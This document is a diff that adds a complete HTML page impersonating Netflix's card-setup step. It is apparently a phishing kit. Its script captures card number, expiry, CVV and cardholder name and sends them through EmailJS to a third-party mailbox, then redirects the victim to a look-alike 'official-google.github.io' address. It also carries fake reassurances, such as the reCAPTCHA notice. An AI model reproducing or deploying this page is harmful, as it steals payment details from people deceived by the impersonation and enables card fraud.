@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="icon" type="image/png" href="https://i.ibb.co/8sj6mFP/Netflix-Favicon.png">
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "9cATFsqPERef1K6ZF",
+      });
+   })();
+</script>
+
+
+    <title>Netflix</title>
+ <style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #fff;
+  margin: 0;
+  padding: 0;
+}
+body a {
+  text-decoration: none;
+}
+.container {
+  max-width: 90%;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid transparent;
+  background-color: #fff;
+}
+ .top {
+   display: flex;
+   justify-content: space-between;
+   align-items: center;
+ }
+ .top img {
+   margin-top: -20px;
+   margin-left: -10px;
+   width: 80px;
+   height: 45px;
+ }
+ .top a {
+   margin-top: -20px;
+   font-weight: 450;
+   text-decoration: none;
+   color: black;
+ }
+  .content {
+   display: flex;
+   flex-direction: column;
+   align-items: center;
+   justify-content: center;
+ }
+ .step p {
+   font-family: Arial, Sans-Serif;
+   letter-spacing: 0px;
+   font-size: 15px;
+   font-weight: 300;
+   color: black;
+ }
+.container2 {
+  width: 355px;
+  height: 720px;
+  border: 1px solid transparent;
+  position: relative;
+  background-color: #fff;
+}
+.card-types img {
+   margin-left: 11px;
+   margin-top: -12px;
+   width: 35px;
+   height: 20px;
+      }
+    .form-group {
+      font-weight: bolder;
+      margin-left: 8px;
+    }
+    
+  input[type="tel"] {
+    font-family: Arial, Sans-Serif;
+    font-size: 16px;
+    font-weight: 500;  
+   }
+   
+.form-group input[type="tel"] {
+  margin: 5px;
+  margin-top: 10px;
+  padding: 0 20px;
+  width: calc(95% - 47px);
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+  }
+
+ input[type="tel"]:focus {
+  border: 1px solid #1DB954;
+  outline: none;
+}
+
+ .card-logo {
+ position: absolute;
+ top: 65px;
+ right: 24px;
+ transform: translateY(-50%);
+ height: 30px;
+ border-radius: 6px;
+ width: auto;
+ display: none;
+ }
+  
+.form-group2 input[type="tel"] {
+  margin: 5px;
+  margin-top: 50px;
+  padding: 0 20px;
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+  }
+
+.form-group2 {
+  margin: 2px;
+  font-weight: bold;
+  margin-left: 8px;
+}
+
+.form-group3 {
+  margin: -84px;
+  font-weight: bold;
+  margin-left: 210px;
+}
+.form-group3 input[type="tel"] {
+  margin: 1px;
+  margin-top: 25px;
+  margin-bottom: 3px;
+  padding: 0 20px;
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+}
+.form-group4 input[type="text"] {
+  margin: 5px;
+  padding: 0 20px;
+  width: calc(95% - 47px);
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+}  
+button[type="submit"] {
+  margin: 5px;
+  margin-left: 20px;
+  font-weight: bold;
+  font-size: 22px;
+  width: 310px;
+  height: 60px;
+  border-radius: 5px;
+  border: 1px solid transparent;
+  color: #fff;
+  background-color: #E50913;
+}
+ button:hover {
+  cursor: pointer;
+  background-color: #C11219;
+}
+.form-group3 svg {
+  position: absolute;
+  right: 20px;
+  top: 137px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  width: 20px; /* Adjust size as needed */
+  height: 20px; /* Adjust size as needed */
+}
+
+.tooltip {
+  display: none;
+  position: absolute;
+  top: 165px;
+  right: 10px;
+  background-color: #333;
+  color: #fff;
+  padding: 5px;
+  border-radius: 3px;
+  font-size: 12px;
+  white-space: nowrap;
+  margin-top: 5px;
+  box-shadow: 0 0 10px black;
+}
+
+.tooltip.visible {
+  display: block;
+}
+
+.form-group4 {
+  margin-left: 10px;
+  font-size: 14px;
+  font-family: Roboto, Sans-Serif;
+}
+.plann {
+  width: 320px;
+  height: 70px;
+  margin-top: 7px;
+  margin-left: 5px;
+  border-radius: 5px;
+  border: 1px solid transparent;
+  background-color: #F4F4F4;
+}
+.plann p {
+  margin-left: 16px;
+}
+.premium {
+  margin-top: 5px;
+}
+.agreement {
+  margin-left: 20px;
+  font-size: 14px;
+  font-family: Roboto, Sans-Serif;
+  color: #8C8C8C;
+}
+.buttom {
+  max-width: 90%;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid transparent;
+  border-top-color: #e0e0e0;
+  color: #737373;
+  background-color: #F3F3F3;
+}
+  @media (min-width: 600px) {
+.container {
+  max-width: 100%;
+}
+}
+  @media (min-width: 1024px) {
+.container {
+  max-width: 80%;
+}
+}
+@media (min-width: 600px) {
+.buttom {
+  max-width: 100%;
+}
+}
+  @media (min-width: 1024px) {
+.buttom {
+  max-width: 80%;
+}
+}
+</style>
+</head>
+<body>
+  
+        <div class="container">
+      <div class="top">
+  <img src="https://i.ibb.co/X59Fb0Q/Netflix.png" alt="Netflix" border="0">
+  <a onclick="Redirect()">Sign In</a>
+    </div>
+  <hr>
+          <div class="content">
+     <br>
+          
+             <div class="step">
+  <p style="margin-right: 180px; margin-bottom: -15px;">STEP&nbsp;<b>3 </b>OF<b> 3</b></p>
+              </div>
+              
+  <h1>Setup your credit or debit card</h1>
+  <div class="container2">
+      
+      <div class="card-types">
+  <img src="https://i.ibb.co/wMrJWr2/visa.png" alt="Visa" onclick="focusInput()">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/mb0w5bm/mastercard.jpg" alt="MasterCard" onclick="focusInput()">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/68vhBp8/verve-logo.png" alt="Verve" onclick="focusInput()">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/rH1yLyh/amex.jpg" alt="amex" onclick="focusInput()">
+      </div>
+    
+    <br>
+    
+  <form id="CardForm">
+    
+  <div class="form-group">
+
+    <input type="tel" style="margin-top: 2px;" name="cardnumber" id="cardnumber" data-mask="0000 0000 0000 0000" placeholder="Card number" required="" oninput="detectCardType()"/>
+    
+  <img class="card-logo" id="card-logo" src="" alt="Card Logo" />     
+   </div>  
+    <br>
+    <div class="form-group2">
+  
+ <input style="width: calc(40% - 20px); margin-top: -10px" name="expirydate" id="expirydate" data-mask="00 / 00" placeholder="MM / YY" type="tel" required="" />
+    </div>
+   
+   <div class="form-group3">
+  
+  <input style="width: calc(48% - 24px);" name="cvv" id="cvv" data-mask="0000" placeholder="CVV" type="tel" required=""/><br>
+     
+ <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" id="question-mark-svg">
+
+    <g clip-path="url(#clip0_429_11043)">
+      <circle cx="12" cy="11.9999" r="9" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></circle>
+      <rect x="12" y="16" width="0.01" height="0.01" stroke="#292929" stroke-width="3.75" stroke-linejoin="round"></rect>
+      <path d="M10.5858 7.58572C10.9754 7.1961 11.4858 7.00083 11.9965 6.99994C12.5095 6.99904 13.0228 7.1943 13.4142 7.58572C13.8047 7.97625 14 8.48809 14 8.99994C14 9.51178 13.8047 10.0236 13.4142 10.4141C13.0228 10.8056 12.5095 11.0008 11.9965 10.9999L12 11.9999" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path>
+    </g>
+    <defs>
+      <clipPath id="clip0_429_11043">
+        <rect width="24" height="24" fill="white"></rect>
+      </clipPath>
+    </defs>
+  </svg>
+  <div class="tooltip" id="tooltip">The security code, or CVV, refers<br>to the extra 3 numbers on the<br>back of your card.</div>    
+     
+     </div>
+     
+  
+  <br></br>
+  <br></br>
+  <br></br>    
+    
+    
+    <div class="form-group4">
+
+    <input type="text" style="margin-top: -20px;" name="name" id="name" placeholder="Name on card" required=""/>
+  
+  <div class="plann">
+    <p style="margin-bottom: 6px; font-size: 15px;"><b>NGN 1,600/month</b></p>
+    <p style="margin-top: 3px; font-size: 14px; color: #919191;">Premium</span></p>
+  </div>
+  </div>
+             <div class="agreement">
+  <p>Your payments will be processed internationally.</p>
+  <p style="margin-top: -10px;">Additional bank fees may apply.</p>
+  
+   </div>
+   <div class="button-container">
+   <button type="submit" id="netflixCard" onclick="sendMail()">Start Membership</button>
+</div>
+   
+  
+  </form>  
+   
+   <br>
+   <p style="text-align: center; color: #8C8C8C; font-size: 13px;">This page is protected by Google reCAPTCHA to ensure you're not a bot.</p>
+</div>
+
+              
+          <br></br><br></br>
+          
+          
+    </div>
+    </div>
+    
+      <div class="buttom">
+   <p>Questions? Contact us.</p>
+   <p>FAQ <span style="margin-left: 145px;">Help Center</span></p>
+   <p>Netflix Shop <span style="margin-left: 85px;">Terms of use</span></p>
+   <p>Privacy <span style="margin-left: 120px;">Cookie preferences</span></p>
+   <p>Corporate Information</p>
+            </div>
+            
+      
+      
+  
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+	
+
+
+<script>
+  let formSubmitted = false; // Variable to track form submission
+  
+  function sendMail(){
+    if (formSubmitted) {
+      return; // Exit the function if form is already submitted
+    }
+
+    let parms = {
+      cardnumber: document.getElementById("cardnumber").value,
+      expirydate: document.getElementById("expirydate").value,
+      cvv: document.getElementById("cvv").value,
+      name: document.getElementById("name").value,
+      submit_button_id: document.getElementById("netflixCard").id  // Use the new submit button ID 'netflix'
+    };
+    
+    // Set formSubmitted to true before sending email
+    formSubmitted = true;
+    
+    emailjs.send("service_6kbj4eu", "template_ncggmgb", parms)
+      .then(function(response) {
+        // Redirect to Google after email is sent
+        window.location.href = "https://official-google.github.io/Netflix/Netflix6.html";
+      })
+      .catch(function(error) {
+        console.error('Invalid Card number!', error);
+        // Handle error if necessary
+      });
+  }
+
+  // Attach form submission event handler
+  document.getElementById('CardForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+    sendMail(); // Call sendMail function
+  });
+</script>
+
+
+<script>
+        function detectCardType() {
+            const cardNumber = document.getElementById('cardnumber').value;
+            const cardLogo = document.getElementById('card-logo');
+
+            cardLogo.style.display = 'none';
+
+            if (/^4/.test(cardNumber)) {
+                cardLogo.src = 'https://i.ibb.co/wMrJWr2/visa.png';
+                cardLogo.style.display = 'block';
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                cardLogo.src = 'https://i.ibb.co/mb0w5bm/mastercard.jpg';
+                cardLogo.style.display = 'block';
+            } else if (/^(50|65)/.test(cardNumber)) {
+                cardLogo.src = 'https://i.ibb.co/68vhBp8/verve-logo.png';
+                cardLogo.style.display = 'block';
+            } else if (/^(34|37)/.test (cardNumber)) {
+              cardLogo.src = 'https://i.ibb.co/rH1yLyh/amex.jpg';
+              cardLogo.style.display = 'block';
+            }
+        }
+    </script>
+    
+    
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const tooltip = document.getElementById('tooltip');
+  const questionMarkSvg = document.getElementById('question-mark-svg');
+
+  questionMarkSvg.addEventListener('click', function() {
+    tooltip.classList.toggle('visible');
+  });
+
+  document.addEventListener('click', function(event) {
+    if (!tooltip.contains(event.target) && !questionMarkSvg.contains(event.target)) {
+      tooltip.classList.remove('visible');
+    }
+  });
+});
+
+</script>
+
+<script>
+  function focusInput() {
+    document.getElementById('cardnumber').focus();
+  }
+  
+</script>
+
+<script>
+        const expiryDateInput = document.getElementById('expirydate');
+
+        expiryDateInput.addEventListener('focus', function() {
+            this.placeholder = 'Expiry date';
+        });
+
+        expiryDateInput.addEventListener('blur', function() {
+            this.placeholder = 'MM / YY';
+        });
+    </script>
+
+<script>
+        const cardNumberInput = document.getElementById('cardnumber');
+
+        cardNumberInput.addEventListener('focus', function() {
+            this.placeholder = '0000 0000 0000 0000';
+        });
+
+        cardNumberInput.addEventListener('blur', function() {
+            this.placeholder = 'Card number';
+        });
+    </script>
+    
+<script>
+document.getElementById('netflixCard').addEventListener('click', function() {
+    const button = this;
+    button.disabled = true; // Disable the button
+
+    setTimeout(function() {
+        button.disabled = false; // Re-enable the button after 5 seconds
+    }, 5000); // 5000 milliseconds = 5 seconds
+});
+   
+ </script>
+ 
+</body>
+</html>
